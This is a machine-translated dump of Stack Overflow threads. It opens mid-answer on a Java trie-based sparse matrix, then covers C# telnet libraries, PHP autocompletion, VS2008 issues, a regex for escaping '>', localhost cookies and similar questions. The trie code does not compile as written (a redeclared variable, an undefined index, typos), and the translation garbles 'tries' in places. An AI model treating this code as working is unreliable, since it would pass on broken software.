                        * changing the position of the current subrange, but
                        * before doing that, we first need to check if the
                        * subrangePositions array itself is also shared
                        * between instances (including the DEFAULT_POSITIONS
                        * that should be preserved, and possible arrays
                        * shared by an external factory contructor whose
                        * source trie was declared immutable in a derived
                        * class). */
                       if (isSharedSubrangePositions) {
                           subrangePositions = subrangePositions.clone();
                           isSharedSubrangePositions = false;
                       }
                       /* TODO: no attempt is made to allocate less than a
                        * fully independant subrange, using possible
                        * interleaving: this would require scanning all
                        * other existing values to find a match for the
                        * modified subrange of values; but this could
                        * potentially leave positions (in the current subrange
                        * of values) unreferenced by any subrange, after the
                        * change of position for the current subrange. This
                        * scanning could be prohibitively long for each
                        * assignement, and for now it's assumed that compact()
                        * will be used later, after those assignements. */
                       values = setlengh(
                           values,
                           (subrangePositions[subrange] =
                            subrangePositions = values.length) +
                           SUBRANGE_POSITIONS);
                       valuePosition = subrangePositions + positionOffset;
                       break;
                   }
               }
               /* Now perform the effective assignment of the value. */
               values[valuePosition] = value;
           }
       }
       return value;
    }

    /**
     * Compact the storage of common subranges.
     * TODO: This is a simple implementation without interleaving, which
     * would offer a better data compression. However, interleaving with its
     * O(N²) complexity where N is the total length of values, should
     * be attempted only after this basic compression whose complexity is
     * O(n²) with n being SUBRANGE_POSITIIONS times smaller than N.
     */
    public void compact() {
        final int oldValuesLength = values.length;
        int newValuesLength = 0;
        for (int oldPosition = 0;
                 oldPosition < oldValuesLength;
                 oldPosition += SUBRANGE_POSITIONS) {
            int oldPosition = positions[subrange];
            bool commonSubrange = false;
            /* Scan values for possible common subranges. */
            for (int newPosition = newValuesLength;
                    (newPosition -= SUBRANGE_POSITIONS) >= 0; )
                if (arrayequals(values, newPosition, oldPosition,
                        SUBRANGE_POSITIONS)) {
                    commonSubrange = true;
                    /* Update the subrangePositions|] with all matching
                     * positions from oldPosition to newPosition. There may
                     * be several index to change, if the trie has already
                     * been compacted() before, and later reassigned. */
                    for (subrange = subrangePositions.length;
                         --subrange >= 0; )
                        if (subrangePositions[subrange] == oldPosition)
                            subrangePositions[subrange] = newPosition;
                    break;
                }
            if (!commonSubrange) {
                /* Move down the non-common values, if some previous
                 * subranges have been compressed when they were common.
                 */
                if (!commonSubrange && oldPosition != newValuesLength) {
                    arraycopy(values, oldPosition, newValuesLength,
                        SUBRANGE_POSITIONS);
                    /* Advance compressed values to preserve these new ones. */
                    newValuesLength += SUBRANGE_POSITIONS;
                }
            }
        }
        /* Check the number of compressed values. */
        if (newValuesLength < oldValuesLength) {
            values = values.arraysetlength(newValuesLength);
            isSharedValues = false;
        }
    }

} 
```

注意：此代码不完整，因为它处理单个矩阵大小，并且它的压缩器仅限于检测常见的子范围，而不是交错它们。

此外，代码不会根据矩阵大小确定用于将矩阵拆分为子范围（对于 x 或 y 坐标）的最佳宽度或高度。它只使用相同的静态子范围大小 16（对于两个坐标），但它可以方便地使用 2 的任何其他小幂（但非 2 的幂会减慢`int indexOf(int, int)`和`int offsetOf(int, int)`内部方法），独立于两个坐标和向上到矩阵的最大宽度或高度。理想情况下，该`compact()`方法应该能够确定最佳拟合尺寸。

如果这些拆分子范围的大小可以变化，则需要为这些子范围大小添加实例成员而不是 static `SUBRANGE_POSITIONS`，并使静态方法`int subrangeOf(int i, int j)`和`int positionOffsetOf(int i, int j)`非静态方法；和初始化数组`DEFAULT_POSITIONS`，并且`DEFAULT_VALUES`需要以不同的方式删除或重新定义。

如果您想支持交错，基本上您将首先将现有值分成两个大小相同的值（两者都是最小子范围大小的倍数，第一个子集可能比第二个子范围多一个子范围），并且您将在所有连续位置扫描较大的一个以找到匹配的交错；那么您将尝试匹配这些值。然后，您将通过将子集分成两半（也是最小子范围大小的倍数）来递归循环，然后再次扫描以匹配这些子集（这会将子集的数量乘以 2：您必须想知道是否加倍subrangePositions 索引的大小与值的现有大小相比值得该值，以查看它是否提供有效的压缩（如果没有，则停在那里：您已经直接从交错压缩过程中找到了最佳子范围大小）。在这种情况下; 在压缩期间，子范围大小将是可变的。

但是此代码显示了如何分配非零值并`data`为其他（非零）子范围重新分配数组，然后如何优化（`compact()`使用该方法执行分配后`setAt(int i, int j, double value)`）在存在重复时存储此数据可以在数据中统一的子范围，并在`subrangePositions`数组中的相同位置重新索引。

无论如何，trie 的所有原则都在那里实现：

1.  使用单个向量而不是数组的双索引数组（每个单独分配）来表示矩阵总是更快（并且在内存中更紧凑，意味着更好的局部性）。改进在方法中是可见的`double getAt(int, int)`！

2.  您节省了大量空间，但是在分配值时可能需要一些时间来重新分配新的子范围。出于这个原因，子范围不应太小，否则重新分配将过于频繁地发生以设置矩阵。

3.  通过检测常见的子范围，可以将初始大矩阵自动转换为更紧凑的矩阵。一个典型的实现将包含一个`compact()`如上所述的方法。但是，如果 get() 访问非常快而 set() 非常快，如果有很多公共子范围要压缩（例如，用自身减去一个大的非稀疏随机填充矩阵时，compact() 可能会非常慢，或将其乘以零：在这种情况下，通过实例化一个新的树并删除旧的树来重置树会更简单、更快）。

4.  公共子范围在数据中使用公共存储，因此该共享数据必须是只读的。如果必须更改单个值而不更改矩阵的其余部分，则必须首先确保它在`subrangePositions`索引中仅被引用一次。否则，您需要在`values`向量的任何位置（方便地在末尾）分配一个新的子范围，然后将这个新子范围的位置存储到`subrangePositions`索引中。

* * *

* * *

请注意，通用 Colt 库虽然非常好，但在处理稀疏矩阵时却没有那么好，因为它使用散列（或行压缩）技术，尽管它是一个暂时不支持尝试的技术出色的优化，既节省空间**又**节省时间，尤其是对于最频繁的 getAt() 操作。

即使是这里描述的尝试的 setAt() 操作也节省了大量时间（这里实现的方式，即设置后不自动压缩，仍然可以根据需求和估计时间来实现，压缩仍然可以节省大量存储空间时间的代价）：节省的时间与子范围内的单元格数量成正比，而节省的空间与每个子范围内的单元格数量成反比。如果然后使用子范围大小，例如每个子范围的单元格数是 2D 矩阵中单元格总数的平方根（使用 3D 矩阵时它将是三次方根），那么这是一个很好的折衷方案。

Colt 稀疏矩阵实现中使用的散列技术的不便之处在于它们增加了大量的存储开销，并且由于可能的冲突而导致访问时间变慢。尝试可以避免所有冲突，然后可以保证在最坏的情况下将线性 O(n) 时间节省到 O(1) 时间，其中 (n) 是可能的冲突数（在稀疏矩阵的情况下，可能是最多矩阵中非默认值单元的数量，即最多矩阵大小的总数乘以与散列填充因子成比例的因子，对于非稀疏即完整矩阵）。

Colt 中使用的 RC（行压缩）技术与 Tries 更接近，但这是另一个代价，这里使用的压缩技术，对于最频繁的只读 get() 操作的访问时间非常慢，而且非常慢setAt() 操作的压缩。此外，使用的压缩不是正交的，这与保留正交性的 Tries 演示不同。尝试也将为相关的查看操作保留这种正交性，例如跨步、转置（被视为基于整数循环模块化操作的跨步操作）、子范围（以及一般的子选择，包括排序视图）。

我只是希望 Colt 将在将来更新以使用 Tries 实现另一个实现（即 TrieSparseMatrix 而不仅仅是 HashSparseMatrix 和 RCSparseMatrix）。这些想法在这篇文章中。

Trove 实现（基于 int->int 映射）也基于类似于 Colt 的 HashedSparseMatrix 的散列技术，即它们具有相同的不便之处。尝试会快得多，消耗的额外空间适中（但这个空间可以优化，甚至在延迟时间内变得比 Trove 和 Colt 更好，对结果矩阵/trie 使用最终的 compact()ion 操作）。

注意：这个 Trie 实现绑定到特定的本机类型（这里是双精度）。这是自愿的，因为使用装箱类型的通用实现具有巨大的空间开销（并且访问时间要慢得多）。在这里，它只使用双精度的原生一维数组，而不是通用向量。但是对于 Tries 来说，当然也可以派生一个泛型实现......不幸的是，Java 仍然不允许编写具有本地类型的所有优点的真正泛型类，除非通过编写多个实现（对于泛型 Object 类型或为每个本机类型），并通过类型工厂提供所有这些操作。该语言应该能够自动实例化本机实现并自动构建工厂（现在即使在 Java 7 中也不是这种情况，这是 .

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2011-02-04T09:04:42.177

以下框架来测试 Java 矩阵库，还提供了一个很好的列表！ [https://lessthanoptimal.github.io/Java-Matrix-Benchmark/](https://lessthanoptimal.github.io/Java-Matrix-Benchmark/)

测试库：

```
* Colt
* Commons Math
* Efficient Java Matrix Library (EJML)
* Jama
* jblas
* JScience (Older benchmarks only)
* Matrix Toolkit Java (MTJ)
* OjAlgo
* Parallel Colt
* Universal Java Matrix Package (UJMP) 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2008-12-24T09:46:58.793

这似乎很简单。

您可以使用 row*maxcolums+column 作为索引来使用数据的二叉树。

要查找项目，您只需计算 row*maxcolums+column 并二进制搜索查找它的树，如果它不存在，您可以返回 null（它是 О(log n)，其中 n 是包含对象的单元格的数量）。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2008-12-24T10:51:59.223

可能不是最快的运行时解决方案，但我能想到的最快的解决方案似乎可行。创建一个 Index 类并将其用作 SortedMap 的键，例如：

```
 SortedMap<Index, Object> entries = new TreeMap<Index, Object>();
    entries.put(new Index(1, 4), "1-4");
    entries.put(new Index(5555555555l, 767777777777l), "5555555555l-767777777777l");
    System.out.println(entries.size());
    System.out.println(entries.get(new Index(1, 4)));
    System.out.println(entries.get(new Index(5555555555l, 767777777777l))); 
```

我的 Index 类看起来像这样（在 Eclipse 代码生成器的帮助下）。

```
public static class Index implements Comparable<Index>
{
    private long x;
    private long y;

    public Index(long x, long y)
    {
        super();
        this.x = x;
        this.y = y;
    }

    public int compareTo(Index index)
    {
        long ix = index.x;
        if (ix == x)
        {
            long iy = index.y;
            if (iy == y)
            {
                return 0;
            }
            else if (iy < y)
            {
                return -1;
            }
            else
            {
                return 1;
            }
        }
        else if (ix < x)
        {
            return -1;
        }
        else
        {
            return 1;
        }
    }

    public int hashCode()
    {
        final int PRIME = 31;
        int result = 1;
        result = PRIME * result + (int) (x ^ (x >>> 32));
        result = PRIME * result + (int) (y ^ (y >>> 32));
        return result;
    }

    public boolean equals(Object obj)
    {
        if (this == obj)
            return true;
        if (obj == null)
            return false;
        if (getClass() != obj.getClass())
            return false;
        final Index other = (Index) obj;
        if (x != other.x)
            return false;
        if (y != other.y)
            return false;
        return true;
    }

    public long getX()
    {
        return x;
    }

    public long getY()
    {
        return y;
    }
} 
```

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2013-02-08T05:08:24.923

你可以看看[la4j](http://la4j.org)（Java 的线性代数）库。它支持稀疏矩阵的[CRS（压缩行存储）](http://netlib.org/utk/papers/templates/node91.html)和[CCS（压缩列存储）](http://netlib.org/utk/papers/templates/node92.html)内部表示。因此，这些是稀疏数据最有效和最快速的内部结构。

[这是在la4j](http://la4j.org)中使用稀疏矩阵的简短示例：

```
Matrix a = new CRSMatrix(new double[][]{ // 'a' - CRS sparse matrix
   { 1.0, 0.0, 3.0 },
   { 0.0, 5.0, 0.0 },
   { 7.0, 0.0\. 9.0 }
});

Matrix b = a.transpose(); // 'b' - CRS sparse matrix

Matrix c = b.multiply(a, Matrices.CCS_FACTORY); // 'c' = 'b' * 'a'; 
                                                // 'c' - CCS sparse matrix 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2008-12-24T12:38:09.320

您可以只使用嵌套映射，但如果您需要对其进行矩阵演算，这可能不是最佳选择

```
 Map<Integer, Map<integer, Object>> matrix; 
```

也许代替对象使用一些元组来存储实际数据，这样您就可以在提取后更轻松地使用它，例如：

```
class Tuple<T extends yourDataObject> {
  public final int x;
  public final int y;
  public final T object;
}

class Matrix {
  private final Map<Integer, Map<interger, Tupple>> data = new...;

 void add(int x, int y, Object object) {
     data.get(x).put(new Tupple(x,y,object);
 }
}

//etc 
```

为简洁起见省略空检查等

* * *

## 回答 #7

> 赞同：-2
> 
> 时间：2014-03-14T15:37:35.650

HashMap 摇滚。只需使用 StringBuilder（不是 + 或 String.format）将索引（作为字符串）与分隔符连接起来，比如“/”，并将其用作键。没有比这更快、更节省内存的了。稀疏矩阵是 20 世纪的。:-)

# iphone - 将框架复制到项目中？

> ID：390187
> 
> 赞同：1
> 
> 时间：2008-12-23T21:58:25.103
> 
> 标签：iphone, xcode, openal

尝试将框架复制到 Xcode 中项目的 Frameworks 文件夹中时，出现错误

> 无法将 /Developer/Platforms/.../Frameworks/OpenAL.framework 复制到 /Users/.../OpenAL.framework

之前不小心把同名的框架错了复制到项目里，删掉了，现在不能复制正确的了？在复制适当的版本之前，如何完全摆脱错误的版本？

提前致谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-12-24T01:05:54.430

您为什么要尝试将 OpenAL.framework 复制到您的项目中？您不需要将框架复制到您的项目目录中以链接它，并且 OpenAL.framework 由操作系统提供（您可以从它位于`/Developer`.)下看出。

另外，请注意 iPhone 不支持第三方框架，您只能使用静态库。我提到这一点是因为您在`iPhone`问题中添加了标签，所以我假设您正在构建一个 iPhone 应用程序。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-12-31T04:37:00.973

您不能为 iPhone 开发添加*新*框架。相反，您应该添加一个*现有的*框架，然后在（例如）中找到该框架`/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS2.1.sdk/System/Library/Frameworks/`

# c# - C# Telnet 库

> ID：390188
> 
> 赞同：54
> 
> 时间：2008-12-23T21:59:10.763
> 
> 标签：c#, .net, telnet

是否有可用于 C#（不是 ASP .NET）的良好、免费的 telnet 库？我在谷歌上找到了一些，但它们都有一个或另一个问题（不支持登录名/密码，不支持脚本模式）。

我假设 MS 仍然没有包含 telnet 库作为 .NET v3.5 的一部分，因为如果是的话我找不到它。不过，我会觉得错了。

* * *

## 回答 #1

> 赞同：52
> 
> 时间：2009-10-08T14:56:33.423

我发现的最佳 C# Telnet Lib 称为 Minimalistic Telnet。非常容易理解、使用和修改。它适用于我需要配置的 Cisco 路由器。

[http://www.codeproject.com/KB/IP/MinimalisticTelnet.aspx](http://www.codeproject.com/KB/IP/MinimalisticTelnet.aspx)

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2012-01-11T22:45:25.680

这是我终于可以工作的代码

```
using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text.RegularExpressions;
using System.Threading;

class TelnetTest
{

    static void Main(string[] args)
    {
        TelnetTest tt = new TelnetTest();

        tt.tcpClient = new TcpClient("myserver", 23);
        tt.ns = tt.tcpClient.GetStream();

        tt.connectHost("admin", "admin");
        tt.sendCommand();

        tt.tcpClient.Close();
    }

public void connectHost(string user, string passwd) {
    bool i = true;
    while (i)
    {
        Console.WriteLine("Connecting.....");
        Byte[] output = new Byte[1024];
        String responseoutput = String.Empty;
        Byte[] cmd = System.Text.Encoding.ASCII.GetBytes("\n");
        ns.Write(cmd, 0, cmd.Length);

        Thread.Sleep(1000);
        Int32 bytes = ns.Read(output, 0, output.Length);
        responseoutput = System.Text.Encoding.ASCII.GetString(output, 0, bytes);
        Console.WriteLine("Responseoutput: " + responseoutput);
        Regex objToMatch = new Regex("login:");
        if (objToMatch.IsMatch(responseoutput)) {
           cmd = System.Text.Encoding.ASCII.GetBytes(user + "\r");
           ns.Write(cmd, 0, cmd.Length);
        }

        Thread.Sleep(1000);
        bytes = ns.Read(output, 0, output.Length);
        responseoutput = System.Text.Encoding.ASCII.GetString(output, 0, bytes);
        Console.Write(responseoutput);
        objToMatch = new Regex("Password");
        if (objToMatch.IsMatch(responseoutput))
        {
            cmd = System.Text.Encoding.ASCII.GetBytes(passwd + "\r");
            ns.Write(cmd, 0, cmd.Length);
        }

        Thread.Sleep(1000);
        bytes = ns.Read(output, 0, output.Length);
        responseoutput = System.Text.Encoding.ASCII.GetString(output, 0, bytes);
        Console.Write("Responseoutput: " + responseoutput);

        objToMatch = new Regex("#");
        if (objToMatch.IsMatch(responseoutput))
        {
            i = false;
        }

    }

    Console.WriteLine("Just works");
}
} 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2010-06-18T20:12:45.230

另一个概念不同的：[http ://www.klausbasan.de/misc/telnet/index.html](http://www.klausbasan.de/misc/telnet/index.html)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-12-24T00:04:30.030

我最终找到了[MinimalistTelnet](http://www.codeproject.com/KB/IP/MinimalisticTelnet.aspx)并将其改编为我的用途。由于我试图附加的唯一**设备，我最终需要能够大量修改代码。

** 在这种情况下，唯一可以有效地解释为脑死亡。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-03-23T14:00:53.800

我目前正在评估两个可能感兴趣的 .NET (v2.0) C# Telnet 库：

*   [http://www.thoughtproject.com/Libraries/Telnet/](http://www.thoughtproject.com/Libraries/Telnet/)
*   [http://dotnettelnet.sourceforge.net/](http://dotnettelnet.sourceforge.net/)

希望这可以帮助。

问候，安迪。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2011-01-11T18:09:56.280

另一个，它是一个较旧的项目，但共享完整的源代码：[http ://telnetcsharp.codeplex.com/](http://telnetcsharp.codeplex.com/)

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2008-12-23T22:08:08.827

我非常怀疑 telnet 库是否会成为 .Net BCL 的一部分，尽管您确实拥有几乎完整的套接字支持，因此模拟 telnet 客户端不会太难，Telnet 在其一般实现中是一种遗留且垂死的技术，其中存在通常位于一个漂亮的新现代外观后面。就 Unix/Linux 变体而言，您会发现开箱即用的 SSH 和启用 telnet 通常被认为是不好的做法。

您可以查看： http: [//granados.sourceforge.net/](http://granados.sourceforge.net/) - .Net 的 SSH 库 [http://www.tamirgal.com/home/dev.aspx?Item=SharpSsh](http://www.tamirgal.com/home/dev.aspx?Item=SharpSsh)

您仍然需要放置自己的包装器来处理事件，以便以脚本方式输入输入。

# php - 使用 PDT/Netbeans 中的类自动完成 PHP 对象？

> ID：390192
> 
> 赞同：8
> 
> 时间：2008-12-23T22:01:16.283
> 
> 标签：php, netbeans, autocomplete

当我像这样使用 new 定义一个类的对象时

```
$blah = new Whatever(); 
```

我得到 $blah 的自动完成功能。**但是，当我将 $blah 作为函数参数时，我该怎么做呢？**没有自动完成我是不完整的。

**编辑**：**如果它在包含中并且 PDT 或 Netbeans 无法弄清楚，我该怎么做？**有没有办法在 PHP 中声明变量的类型？

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2008-12-28T09:59:52.990

第一条评论中的方法称为“类型提示”，但您应该明智地使用它。更好的解决方案是 phpDoc。

```
/**
 * Some description of function behaviour.
 *
 * @param Whatever $blah
 */
public function myFunction($blah)
{
    $blah-> 
    // Now $blah is Whatever object, autocompletion will work.
} 
```

你也可以使用一个内联的 phpDoc 注释来做同样的事情。

```
public function myFunction($blah)
{
    /* @var $blah Whatever  */
    $blah-> 
    // Now $blah is Whatever object, autocompletion will work.
} 
```

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2008-12-23T22:11:22.567

尝试将参数类定义传递给函数：

```
function myFunction(Whatever $blah) {
} 
```

# visual-studio-2008 - 在将文件检入 SourceSafe 之前，如何查看 VS2008 中的差异？

> ID：390195
> 
> 赞同：2
> 
> 时间：2008-12-23T22:02:33.987
> 
> 标签：visual-studio-2008, version-control, asp-classic, visual-sourcesafe

我们有一个旧的 Classic ASP 应用程序，我们一直在使用 Visual Studio 6 来维护它。这工作得很好，但我们已经准备好走出石器时代，我想看看我是否可以使用 Visual Studio 2008 (SP1) 来维护应用程序。

过去，多个开发人员可以在应用程序上工作，并且它处于源代码控制之下。我们在 Web 服务器上安装了 FrontPage 服务器扩展 (FSE)，并且在客户端上的 Visual Interdev、Web 服务器上的 FSE 和允许我们通过 Interdev 签入和签出文件的 SourceSafe 数据库之间进行了某种三向集成. 文件被检出到 Web 服务器，而不是客户端。当通过 Interdev 重新签入文件时，我们可以在签入之前按下“Diff”按钮来查看对文件所做的更改。

现在我已经安装了 Visual Studio 2008 (SP1)，我正在尝试获得相同的功能。我使用文件/打开网站/远程站点来启动项目。这工作正常，我能够签入和签出文件。但是，查看差异的选项被禁用。此外，当我在“签入”对话框窗口中输入评论时，该评论会被忽略。换句话说，如果您使用 SourceSafe 独立客户端查看文件的历史记录，文件会正确签入，但没有注释。

在 VS2008 中签出文件后，当我右键单击它时，“比较”和“查看历史记录”选项被禁用。此外，如果我单击“签入”选项，“签入”对话框中的“比较版本”按钮将被禁用。启用比较选项有什么技巧吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2008-12-23T23:47:38.877

确保您的解决方案正确绑定到源代码管理（文件 -> 源代码管理）。还要检查选项对话框中的源代码控制设置，确保选择了正确的提供程序。

如果您创建一个新项目 (.NET) 并将其添加到源代码管理中，这些功能是否有效？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-12-24T18:22:47.613

好问题（关于添加一个新项目以查看它是如何工作的）。我创建了一个新的 ASP.NET 网站，但 Visual Studio 告诉我它无法将该网站添加到源代码管理中，因为您需要通过 Web 服务器上的 FrontPage 服务器扩展来执行此操作。我在 Web 服务器上运行 IIS 管理器并将网站添加到 SourceSafe。然后下次我在 VS2008 中打开该项目时，它显示在源代码管理下。但是，“查看历史记录”和“比较”选项仍然被禁用。

所以，我想这个问题与我的旧经典 ASP 站点无关。也许这只是当您针对运行 FrontPage Server Extensions 2002 的远程 Web 服务器使用 Visual Studio 2008 时存在的限制。是否有更新版本的 FPSE？另外，我没有在远程服务器上的 IIS 下启用 ASP.NET 3.5 是否重要？现在它只启用了 ASP.NET 2.0。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-02-21T13:33:07.410

通常我不再使用 IIS 进行开发。使用 VS2005 和 VS2008，您可以创建基于文件的网站（或 Web 应用程序），这些网站与 VS 内置的网络服务器一起运行。那么您就不必为 IIS、首页扩展或 IIS 强加的权限问题而蒙混过关了。对于经典的 asp，这总是一种麻烦。

vs 网站体验和 IIS 之间很少有“保真度”差异，因此当我部署到 IIS 时，我不必担心初始 IIS 设置后的差异。VS 中的调试工作几乎完美无缺，在 IIS 上调试可能会出现一些问题。

因此，源代码控制似乎也很容易工作，并且仅限于我的 dev 目录。

# visual-studio-2008 - VS2008 IDE 在 aspx 和 aspx.cs 之间切换标签时有 5 秒的延迟，怎么会？

> ID：390200
> 
> 赞同：2
> 
> 时间：2008-12-23T22:07:28.423
> 
> 标签：visual-studio-2008, ide, latency

我在 XP sp2 笔记本电脑上安装了 VS2008 (SP1)。

IDE 上的一件事很奇怪，我不知道如何解决它。

我正在编写一个 Web 应用程序，同时打开许多选项卡。当我从 aspx 来回切换到 aspx.cs 时，我总是有大约 5 秒的延迟才能输入键盘。

我认为这可能与一些背景布局渲染过程有关，但我从未从 aspx 页面打开“设计”屏幕，我总是打开“源”屏幕。这 5 秒的延迟很烦人。

有什么配置吗？建议？

非常感谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-12-23T23:06:51.033

Visual Studio 真的很喜欢具有大量显存的优质视频卡。它使用它来合成网页。

此外，它通常只是一种资源消耗。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-12-23T23:14:28.617

也许[这个线程](http://social.msdn.microsoft.com/forums/en-US/vssetup/thread/49ab7810-f298-413b-8c9f-a060b04f71fe/)可以提供任何帮助，这似乎表明是 HTML 验证使切换变得非常缓慢。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-12-23T23:08:47.503

您离使用机器上的所有物理 RAM 有多近？此外，当您执行此操作时，还有多少其他进程正在运行，例如您是否有防病毒软件、少量自动更新程序（Microsoft、Apple、Java、HP 驱动程序）、Windows 错误报告、SQL Server 等服务。 跑步？

正如其他人所指出的那样，它可能会占用资源，如果这是在打开程序的早期，可能会有诸如加载程序集之类的背景事情发生。

# c# - 将 > 转换为 HTML 字符串中等效的 HTML 实体

> ID：390205
> 
> 赞同：4
> 
> 时间：2008-12-23T22:09:40.213
> 
> 标签：c#, regex, parsing, html-parsing

我试图在包含 HTML 标记的 HTML 字符串中将 > 字符的所有实例转换为其等效的 HTML 实体 >。我所能得到的最远的解决方案是使用正则表达式。

这是我到目前为止所拥有的：

```
 public static readonly Regex HtmlAngleBracketNotPartOfTag = new Regex("(?:<[^>]*(?:>|$))(>)", RegexOptions.Compiled | RegexOptions.Singleline); 
```

我遇到的主要问题是隔离不属于 HTML 标记的单个 > 字符。我不想转换任何现有标签，因为我需要保留 HTML 以进行渲染。如果我不转换 > 字符，我会得到格式错误的 HTML，这会导致浏览器出现渲染问题。

这是要解析的测试字符串的示例：

```
"Ok, now I've got the correct setting.<br/><br/>On 12/22/2008 3:45 PM, jproot@somedomain.com wrote:<br/><div class"quotedReply">> Ok, got it, hope the angle bracket quotes are there.<br/>><br/>> On 12/22/2008 3:45 PM, > sbartfast@somedomain.com wrote:<br/>>> Please someone, reply to this.<br/>>><br/>><br/></div>" 
```

在上面的字符串中，作为 HTML 标记一部分的 > 字符都不应转换为 >。所以这：

```
<div class"quotedReply">> 
```

应该变成这样：

```
<div class"quotedReply">&gt; 
```

另一个问题是上面的表达式使用了一个非捕获组，这很好，除了匹配在第 1 组中。我不太确定如何仅在第 1 组上进行替换并保留其余部分匹配。看起来 MatchEvaluator 并没有真正做到这一点，或者我现在无法想象它。

我怀疑我的正则表达式可以做一些爱。

有人有什么好主意吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-12-23T22:50:44.250

你为什么要这样做？> 有什么害处？我遇到的大多数解析器都对 > 本身感到非常满意，而无需将其转义为实体。

此外，在将内容字符串与包含 HTML 标记的字符串连接之前，使用 HtmlUtilty.HtmlEncode 正确编码内容字符串会更合适，因此如果这在您的控制之下，您应该考虑在那里处理它。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2008-12-23T23:15:46.023

诀窍是捕获*不是*目标的所有内容，然后将其与更改的文本一起重新插入，如下所示：

```
Regex.Replace(str, @"\G((?>[^<>]+|<[^>]*>)*)>", "$1&gt;"); 
```

但是安东尼的权利：文本节点中的直角括号不应该引起任何问题。将 HTML 与正则表达式匹配是很棘手的；例如，评论和 CDATA 几乎可以包含任何内容，因此强大的正则表达式必须专门匹配它们。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-12-23T22:23:08.033

也许将您的 HTML 读入一个 XML 解析器，该解析器应该为您处理转换。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-12-23T22:23:33.603

您是在谈论 HTML 标记内的 > 字符（如 Java 的 innerText 中）还是 HTML 标记的争论列表中？

如果您只想清理开始标签和结束标签之间的文本，那应该很简单。只需找到任何 > 字符，并将其替换为 > ;。（我也会使用 < 标签），但是 HTML 渲染引擎应该为你处理这个问题......

举一个你想要消毒的例子，也许我们会找到最好的解决方案。

拉里

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-12-23T22:23:59.153

您能否将字符串读入 XML 文档并查看值并将值中的替换`>`为`&gt;`。这将需要递归地进入文档中的每个节点，但这不应该太难做到。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2008-12-23T22:33:15.877

Steve_C，你可以试试这个 RegEx。这将捕获参考 1 中的任何 HTML 标记，并且标记之间的文本存储在捕获 2 中。我没有对此进行完全测试，只是将它扔在那里以防万一。

```
<([A-Z][A-Z0-9]*)[^>]*>(.*?)</\1> 
```

# cookies - 为什么 asp.net 不在 localhost 中创建 cookie？

> ID：390219
> 
> 赞同：46
> 
> 时间：2008-12-23T22:15:56.970
> 
> 标签：cookies, localhost

好吧，这真的有点开始困扰我了。我有一个简单的 Web 项目设置位于：“C:\Projects\MyTestProject\”。在我机器上的 IIS 中，我已将一个虚拟目录映射到此位置，因此我可以在本地运行我的站点（我知道我可以从 Visual Studio 运行它，我更喜欢这种方法）。我已将此虚拟目录命名为“mtp”，并通过[http://localhost/mtp/index.aspx](http://localhost/mtp/index.aspx)访问它。所有这一切都很好。

但是，每当我尝试创建一个 cookie 时，它​​就永远不会被写出来？我已经在 FF3 和 IE7 中尝试过，但它根本不会写出 cookie。我不明白。我的主机文件中确实有“127.0.0.1 localhost”，我真的想不出我还能做什么。感谢您的任何建议。

詹姆士

* * *

## 回答 #1

> 赞同：95
> 
> 时间：2010-04-26T14:31:38.387

cookie 规范需要两个名称和一个点，因此您的 cookiedomain 不能是“localhost”。这是我解决它的方法：

1.  将此添加到您的 %WINDIR%\System32\drivers\etc\hosts 文件：127.0.0.1 dev.livesite.com

2.  开发时使用[http://dev.livesite.com](http://dev.livesite.com)而不是[http://localhost](http://localhost)

3.  创建 cookie 时，使用“.livesite.com”作为 cookiedomain（以点开头）。现代浏览器[不再需要前导点](https://stackoverflow.com/a/20884869/2440)，但您可能仍想使用以实现向后兼容性。

4.  现在它适用于所有网站：

    *   [http://dev.livesite.com](http://dev.livesite.com)
    *   [http://www.livesite.com](http://www.livesite.com)
    *   [http://livesite.com](http://livesite.com)

* * *

## 回答 #2

> 赞同：17
> 
> 时间：2014-05-28T18:03:34.073

由于从未选择过答案，我想我仍然可以在那里抛出其他东西。

使用在 localhost 下运行的应用程序无法编写任何 cookie 的原因之一是 web.config 中的 httpCookies 设置。如果域属性设置为特定域并且您在 localhost 下运行，则不会为我编写 cookie。

删除开发中的域属性并写入cookie：

```
<!-- Development -->
<httpCookies httpOnlyCookies="true" requireSSL="false" />
<!-- Production -->
<!--<httpCookies domain=".domain.com" httpOnlyCookies="true" requireSSL="true" />--> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-12-23T22:21:47.553

您是否为 cookie 指定了过期日期？默认情况下，cookie 将在浏览器会话过期时过期，这意味着它不会向磁盘写入任何内容。

# java - 帮助 Java Web 应用程序的初学者

> ID：390231
> 
> 赞同：2
> 
> 时间：2008-12-23T22:23:44.913
> 
> 标签：java, eclipse, model-view-controller

我有相当大的 .net 背景，我决定将我的一个网站移植到 Java。（现在随着 asp.net MVC 的热潮，我想我最好学习一种更成熟的 MVC 方法）。

我已经下载了eclipse（确切地说是easyeclipse发行版，并且准备好并愿意用java开发我的第一个网站）。

我以前编写过 j2me 应用程序，所以我知道语言和一些框架。

有人可以指导我吗？有什么建议吗？

* * *

